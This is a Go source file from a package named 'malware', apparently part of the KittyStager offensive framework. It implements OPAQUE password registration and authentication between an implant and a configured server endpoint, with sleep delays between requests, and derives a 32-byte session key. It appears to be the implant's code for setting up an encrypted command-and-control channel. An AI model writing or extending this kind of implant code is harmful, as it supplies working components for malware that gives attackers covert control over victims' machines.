package malware

import (
	crypto2 "KittyStager/internal/crypto"
	"encoding/json"
	"fmt"
	"github.com/frekui/opaque"
)


// DoPwreg is the OPAQUE registration sequence
func DoPwreg(username, password string, config Config) error {
	sess, msg1, err := opaque.PwRegInit(username, password, 512)
	if err != nil {
		return err
	}
	data1, err := json.Marshal(crypto2.Req{Req: "req1", Msg1: msg1})
	if err != nil {
		return err
	}
	data2, err := PostRequest(data1, config.RegEndpoint, config)
	if err != nil {
		return err
	}
	var msg2 opaque.PwRegMsg2
	if err := json.Unmarshal(data2, &msg2); err != nil {
		return err
	}
	msg3, err := opaque.PwReg2(sess, msg2)
	if err != nil {
		return err
	}
	data3, err := json.Marshal(crypto2.Req{Req: "req2", Msg3: msg3})
	if err != nil {
		return err
	}
	sleep(config)
	final, err := PostRequest(data3, config.RegEndpoint, config)
	if err != nil {
		return err
	}
	if string(final) != "ok" {
		return fmt.Errorf("expected final ok, got %s", string(final))
	}
	return nil
}

// DoAuth is the OPAQUE authentication sequence
func DoAuth(username, password string, config Config) (string, error) {
	sess, msg1, err := opaque.AuthInit(username, password)
	if err != nil {
		return "", err
	}
	data1, err := json.Marshal(crypto2.Req{Req: "auth1", AMsg1: msg1})
	if err != nil {
		return "", err
	}
	sleep(config)
	data2, err := PostRequest(data1, config.RegEndpoint, config)
	if err != nil {
		return "", err
	}
	var msg2 opaque.AuthMsg2
	if err := json.Unmarshal(data2, &msg2); err != nil {
		return "", err
	}
	sharedSecret, msg3, err := opaque.Auth2(sess, msg2)
	if err != nil {
		return "", err
	}
	data3, err := json.Marshal(crypto2.Req{Req: "auth2", AMsg3: msg3})
	if err != nil {
		return "", err
	}
	sleep(config)
	ok, err := PostRequest(data3, config.RegEndpoint, config)
	if err != nil {
		return "", err
	}
	if string(ok) != "ok" {
		fmt.Printf("Expected ok, got '%s'", string(ok))
		return "", err
	}
	// generate a 32 byte key
	finalKey := crypto2.GenerateKey(sharedSecret, 32)
	return finalKey, nil
}
